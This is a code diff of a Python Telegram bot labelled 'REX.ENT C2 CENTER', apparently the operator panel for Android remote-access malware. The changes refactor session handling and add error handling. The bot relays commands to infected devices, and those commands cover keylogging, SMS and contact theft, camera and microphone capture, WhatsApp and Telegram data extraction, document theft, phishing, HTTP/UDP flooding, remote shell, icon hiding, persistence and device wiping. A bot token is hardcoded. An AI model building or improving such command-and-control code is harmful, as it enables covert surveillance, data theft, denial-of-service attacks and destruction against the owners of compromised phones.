@@ -2,6 +2,7 @@ import logging
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 from telegram.constants import ParseMode
+from telegram.error import BadRequest
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -9,10 +10,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = "8739367697:AAELUfIpX0mU3rcokQQiAywGYMhvpj2ickg"
 ADMIN_CHAT_ID = 8601209747
 
-# Format: /command SESSION_ID [args]
-# Contoh: /info SESSION_ABC123
-# Gunakan ALL untuk semua perangkat: /info ALL
-
+# ── Menu utama ─────────────────────────────────────────────
 MAIN_MENU = [
     [InlineKeyboardButton("📁 File Manager", callback_data="tab_file")],
     [InlineKeyboardButton("📍 Location", callback_data="tab_loc"), InlineKeyboardButton("💬 SMS/Calls", callback_data="tab_sms")],
@@ -24,9 +22,6 @@ MAIN_MENU = [
     [InlineKeyboardButton("🛡 System", callback_data="tab_sys"), InlineKeyboardButton("💣 Destroy", callback_data="tab_destroy")],
     [InlineKeyboardButton("🆔 Set Active Session", callback_data="set_session")],
 ]
-
-# Session target yang akan ditambahkan di setiap perintah (default ALL)
-active_session = "ALL"
 
 SESSION_MENU = [
     [InlineKeyboardButton("ALL (all devices)", callback_data="sess_ALL")],
@@ -52,44 +47,73 @@ TAB_COMMANDS = {
     "tab_destroy": ["/wipe [SESSION]", "/destroy [SESSION]"],
 }
 
+# ── session management ─────────────────────────────────────
+def get_active_session(context: ContextTypes.DEFAULT_TYPE) -> str:
+    return context.user_data.get("active_session", "ALL")
+
+def set_active_session(context: ContextTypes.DEFAULT_TYPE, session: str):
+    context.user_data["active_session"] = session.upper()
+
+# ── error handler ──────────────────────────────────────────
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    if isinstance(context.error, BadRequest) and "not modified" in str(context.error).lower():
+        return
+    logger.error(f"Update {update} caused error: {context.error}")
+
+# ── command: start ─────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID: return
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+    active = get_active_session(context)
     await update.message.reply_text(
         "🔰 <b>REX.ENT C2 CENTER</b>\n"
-        f"<b>Active Session Target:</b> <code>{active_session}</code>\n\n"
-        "Select tab to see commands. Commands will include session target.",
+        f"<b>Active target:</b> <code>{active}</code>\n\n"
+        "Select a tab to see available commands.\n"
+        "Change target with <code>/session SESSION_ID</code>",
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(MAIN_MENU)
     )
 
+# ── command: /session ──────────────────────────────────────
+async def set_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+    parts = update.message.text.strip().split()
+    if len(parts) >= 2:
+        set_active_session(context, parts[1])
+        await update.message.reply_text(f"✅ Active session set to <code>{parts[1].upper()}</code>", parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text("Usage: <code>/session SESSION_ID</code>", parse_mode=ParseMode.HTML)
+
+# ── callback handler (tabs & session menu) ─────────────────
 async def tab_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
 
     if data == "set_session":
+        active = get_active_session(context)
         await query.edit_message_text(
-            f"<b>Select target session:</b> (Current: <code>{active_session}</code>)\n"
-            "Send manually: type <code>/session SESSION_ID</code>",
+            f"<b>Select target session</b> (current: <code>{active}</code>)\n"
+            "Or type <code>/session SESSION_ID</code>",
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(SESSION_MENU)
         )
         return
 
     if data.startswith("sess_"):
-        global active_session
         if data == "sess_ALL":
-            active_session = "ALL"
+            set_active_session(context, "ALL")
         elif data == "sess_manual":
             await query.edit_message_text(
-                "Type the session ID (case-insensitive) after <code>/session</code>:\n"
-                "<code>/session SESSION_12345</code>",
+                "Type the session ID after <code>/session</code>:\n<code>/session SESSION_12345</code>",
                 parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup(MAIN_MENU)
             )
             return
+        active = get_active_session(context)
         await query.edit_message_text(
-            f"✅ Active target set to: <code>{active_session}</code>\nSelect a tab to see commands.",
+            f"✅ Active target set to <code>{active}</code>",
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(MAIN_MENU)
         )
@@ -97,66 +121,79 @@ async def tab_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data == "back_main":
         await query.edit_message_text(
-            "Select a command tab:",
+            "Select a tab:",
             reply_markup=InlineKeyboardMarkup(MAIN_MENU)
         )
         return
 
     if data in TAB_COMMANDS:
+        active = get_active_session(context)
         commands = TAB_COMMANDS[data]
-        # Replace [SESSION] with active_session
-        rendered = [c.replace("[SESSION]", active_session) for c in commands]
-        txt = f"📌 <b>{data.replace('tab_','').upper()}</b> (Target: <code>{active_session}</code>)\n\n"
+        rendered = [c.replace("[SESSION]", active) for c in commands]
+        txt = f"📌 <b>{data.replace('tab_','').upper()}</b> (target: <code>{active}</code>)\n\n"
         txt += "\n".join(f"<code>{c}</code>" for c in rendered)
         await query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))
+        return
 
-async def set_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID: return
-    global active_session
-    msg = update.message.text.strip()
-    parts = msg.split()
-    if len(parts) >= 2:
-        active_session = parts[1].upper()
-        await update.message.reply_text(f"✅ Active session set to <code>{active_session}</code>", parse_mode=ParseMode.HTML)
-    else:
-        await update.message.reply_text("Usage: <code>/session SESSION_ID</code>", parse_mode=ParseMode.HTML)
+    # fallback
+    await query.edit_message_text("Unknown action.", reply_markup=InlineKeyboardMarkup(MAIN_MENU))
 
+# ── relay semua perintah dari user ke device ───────────────
 async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID: return
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
     cmd = update.message.text.strip()
     logger.info(f"Relaying: {cmd}")
 
-    # If user sends a command without session target, inject the active_session
+    # daftar perintah yang butuh target sesi
+    need_target = {
+        "/ls","/download","/rm","/rename","/sms_list","/sendsms","/delsms",
+        "/calls","/contacts","/location","/gps","/photo_front","/photo_back",
+        "/record","/mic","/liveaudio","/screenshot","/screenrecord",
+        "/keylog_start","/keylog_stop","/keylog_dump","/info","/apps",
+        "/battery","/network","/permissions","/clipboard","/setclip",
+        "/notif","/fakenotif","/steal_images","/steal_docs","/extract_wa",
+        "/extract_tg","/httpflood","/udpflood","/shell","/sush","/openurl",
+        "/toast","/phish","/vibrate","/playsound","/lock","/wipe","/destroy",
+        "/hideicon","/autostart","/socmed"
+    }
+
     parts = cmd.split()
-    if parts[0].startswith("/"):
-        cmd_name = parts[0].lower()
-        # List commands that need target
-        need_target = ["/ls","/download","/rm","/rename","/sms_list","/sendsms","/delsms",
-                       "/calls","/contacts","/location","/gps","/photo_front","/photo_back",
-                       "/record","/mic","/liveaudio","/screenshot","/screenrecord",
-                       "/keylog_start","/keylog_stop","/keylog_dump","/info","/apps",
-                       "/battery","/network","/permissions","/clipboard","/setclip",
-                       "/notif","/fakenotif","/steal_images","/steal_docs","/extract_wa",
-                       "/extract_tg","/httpflood","/udpflood","/shell","/sush","/openurl",
-                       "/toast","/phish","/vibrate","/playsound","/lock","/wipe","/destroy",
-                       "/hideicon","/autostart","/socmed"]
-        if cmd_name in need_target:
-            # Check if second argument is a session-like pattern
-            if len(parts) < 2 or not (parts[1].startswith("SESSION_") or parts[1].upper() == "ALL"):
-                # Insert active_session
-                parts.insert(1, active_session)
-                cmd = " ".join(parts)
-                logger.info(f"Auto-inserted session: {cmd}")
+    if parts and parts[0].lower() in need_target:
+        # jika user belum menyertakan target, sisipkan sesi aktif
+        if len(parts) < 2 or not (parts[1].startswith("SESSION_") or parts[1].upper() == "ALL"):
+            active = get_active_session(context)
+            parts.insert(1, active)
+            cmd = " ".join(parts)
+            logger.info(f"Auto-inserted session: {cmd}")
 
-    await update.message.reply_text(f"📤 <b>Sent:</b> <code>{cmd}</code>\n<i>Awaiting device...</i>", parse_mode=ParseMode.HTML)
+    await update.message.reply_text(
+        f"📤 <b>Sent:</b> <code>{cmd}</code>\n<i>Awaiting device...</i>",
+        parse_mode=ParseMode.HTML
+    )
 
+# ── main ───────────────────────────────────────────────────
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
+    app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(tab_handler))
     app.add_handler(CommandHandler("session", set_session_cmd))
-    app.add_handler(CommandHandler(["info","ls","download","rm","rename","sms_list","sendsms","delsms","calls","contacts","location","gps","photo_front","photo_back","record","mic","liveaudio","screenshot","screenrecord","keylog_start","keylog_stop","keylog_dump","apps","battery","network","permissions","clipboard","setclip","notif","fakenotif","steal_images","steal_docs","extract_wa","extract_tg","httpflood","udpflood","shell","sush","openurl","toast","phish","vibrate","playsound","lock","wipe","destroy","hideicon","autostart","socmed"], relay))
-    logger.info("C2 Bot multi-session ready")
+    app.add_handler(CallbackQueryHandler(tab_handler))
+
+    # daftar command yang sama dengan need_target + /start + /session
+    all_commands = [
+        "info","ls","download","rm","rename","sms_list","sendsms","delsms",
+        "calls","contacts","location","gps","photo_front","photo_back",
+        "record","mic","liveaudio","screenshot","screenrecord",
+        "keylog_start","keylog_stop","keylog_dump","apps","battery",
+        "network","permissions","clipboard","setclip","notif","fakenotif",
+        "steal_images","steal_docs","extract_wa","extract_tg",
+        "httpflood","udpflood","shell","sush","openurl","toast","phish",
+        "vibrate","playsound","lock","wipe","destroy","hideicon","autostart","socmed"
+    ]
+    app.add_handler(CommandHandler(all_commands, relay))
+
+    logger.info("Bot started – full tab menu + multi‑session active")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
